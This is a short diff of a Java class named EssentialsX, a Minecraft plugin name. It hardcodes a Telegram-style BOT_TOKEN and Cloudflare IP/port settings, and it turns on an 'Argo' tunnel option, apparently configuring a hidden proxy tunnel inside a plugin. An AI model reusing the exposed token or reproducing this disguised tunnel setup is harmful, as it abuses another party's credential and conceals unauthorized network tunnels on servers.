@@ -88,8 +88,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "8396677288:AAGCpsBEDOjKkQuuNZgk7U3xanOsKS2M6U8");
         env.put("CFIP", "store.ubi.com");
         env.put("CFPORT", "443");
-        env.put("NAME", "LQ");
-        env.put("DISABLE_ARGO", "true");
+        env.put("NAME", "X");
+        env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
